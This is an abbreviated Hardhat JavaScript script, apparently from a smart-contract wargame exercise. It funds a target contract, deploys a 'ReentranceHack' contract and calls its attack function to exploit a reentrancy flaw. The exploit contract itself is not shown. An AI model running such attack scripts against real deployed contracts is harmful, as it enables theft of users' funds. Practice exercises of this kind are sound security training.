...
async function getContract(wallet) {
  ...
  if(hre.network.name == "hardhat") {
    ...
    await (await contract.donate(contract.signer.address, {value: ethers.utils.parseEther("0.01")})).wait();
  }
  else {
...
async function main() {
  ...
  const factory = await hre.ethers.getContractFactory("ReentranceHack", hacker);
  let hack = await factory.deploy();
  await hack.deployed();

  await (await hack.attack(contract.address, {value: ethers.utils.parseEther("0.01")})).wait();
